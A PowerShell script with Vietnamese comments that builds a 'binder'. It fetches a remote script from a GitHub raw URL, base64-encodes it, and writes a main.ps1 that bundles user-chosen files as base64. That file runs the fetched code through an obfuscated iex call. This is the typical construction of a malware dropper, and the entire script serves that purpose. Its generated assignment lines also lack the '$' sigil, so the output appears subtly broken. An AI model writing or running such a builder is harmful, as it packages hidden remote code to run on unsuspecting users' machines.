# Hiển thị danh sách các file trong thư mục hiện tại để chọn
$url = "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/main.ps1"
$content = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
$codebinder = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
$files = Get-ChildItem -File ".\fileinhere" | Out-GridView -PassThru -Title "Chọn file để thêm vào main.ps1"

# Xóa file main.ps1 nếu tồn tại
if (Test-Path "main.ps1") {
    Remove-Item "main.ps1"
}

# Tạo lại file main.ps1 và thêm nội dung cần thiết
foreach ($file in $files) {
    # Đọc nội dung file và encode base64
    $fileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($file.FullName))
    $fileName = $file.Name

    # Thêm nội dung vào main.ps1
    Add-Content -Path "main.ps1" -Value "Filecontent = '$fileContent'"
    Add-Content -Path "main.ps1" -Value "name = '$fileName'"
    Add-Content -Path "main.ps1" -Value "iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$codebinder')))"
}

# Thêm dòng cuối cùng vào main.ps1


# Thông báo hoàn thành
Write-Output "Đã hoàn tất tạo file main.ps1"

